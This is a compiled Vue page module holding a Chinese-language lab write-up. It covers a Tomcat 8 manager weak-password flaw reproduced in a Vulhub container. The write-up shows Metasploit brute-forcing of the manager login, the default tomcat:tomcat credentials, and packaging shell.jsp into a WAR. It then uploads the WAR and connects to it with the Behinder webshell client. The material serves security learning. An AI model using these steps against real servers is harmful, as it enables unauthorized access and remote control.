import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as r,c as o,a,b as e,d as s,e as t}from"./app-58e4a7d6.js";const c={},d=t('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>Tomcat7+权限分为：</p><ul><li>manager（后台管理） <ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul></li><li>host-manager（虚拟主机管理） <ul><li>admin-gui 拥有html页面权限</li><li>admin-script 拥有text接口权限</li></ul></li></ul>',4),m={href:"http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html",target:"_blank",rel:"noopener noreferrer"},u=t(`<p>在<code>conf/tomcat-users.xml</code>文件中配置用户的权限：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;
              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
              version=&quot;1.0&quot;&gt;

    &lt;role rolename=&quot;manager-gui&quot;/&gt;
    &lt;role rolename=&quot;manager-script&quot;/&gt;
    &lt;role rolename=&quot;manager-jmx&quot;/&gt;
    &lt;role rolename=&quot;manager-status&quot;/&gt;
    &lt;role rolename=&quot;admin-gui&quot;/&gt;
    &lt;role rolename=&quot;admin-script&quot;/&gt;
    &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;
    
&lt;/tomcat-users&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可见，用户tomcat拥有上述所有权限，密码是<code>tomcat</code>。</p><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>Tomcat版本：8.0</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub无需编译，直接启动整个环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>访问<code>http://your-ip:8080/</code>即可访问Apache Tomcat/8.0.43页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="metasploit爆破tomcat弱口令" tabindex="-1"><a class="header-anchor" href="#metasploit爆破tomcat弱口令" aria-hidden="true">#</a> metasploit爆破tomcat弱口令</h3><p>访问<code>http://your-ip:8080/</code>，点击Manager App：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412133434883.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>跳转tomcat管理页面<code>http://your-ip:8080/manager/html</code>，提示输入用户名和密码：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412133846764.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在kali中使用metasploit对tomcat用户名和密码进行爆破：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>┌──(root kali)-[/home/kali]
└─# msfconsole

# 搜索tomcat相关模块
msf6 &gt; search tomcat
...
   23  auxiliary/scanner/http/tomcat_mgr_login	normal     No     Tomcat Application Manager Login Utility
...

# 使用tomcat_mgr_login模块进行爆破
msf6 &gt; use auxiliary/scanner/http/tomcat_mgr_login

# 设置服务地址
msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt;show options
msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set RHOSTS &lt;your-ip&gt;
RHOSTS =&gt; &lt;your-ip&gt;
msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>爆破成功，用户名密码为<code>tomcat:tomcat</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412135451368.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>输入弱密码<code>tomcat:tomcat</code>，即可访问后台。</p><h3 id="制作war包并上传" tabindex="-1"><a class="header-anchor" href="#制作war包并上传" aria-hidden="true">#</a> 制作war包并上传</h3><p>首先制作war包<code>project.war</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>E:\\Behinder3\\server&gt;jar -cvf project.war shell.jsp
已添加清单
正在添加: shell.jsp(输入 = 612) (输出 = 449)(压缩了 26%)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传war包：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412135536050.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功部署：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412140450360.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>冰蝎3成功连接<code>http://your-ip:8080/project/shell.jsp</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412143831721.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,30);function p(g,h){const i=l("ExternalLinkIcon");return r(),o("div",null,[d,a("p",null,[e("这些权限的究竟有什么作用，详情阅读 "),a("a",m,[e("http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html"),s(i)])]),u])}const x=n(c,[["render",p],["__file","Apache Tomcat8 弱口令_后台getshell漏洞.html.vue"]]);export{x as default};
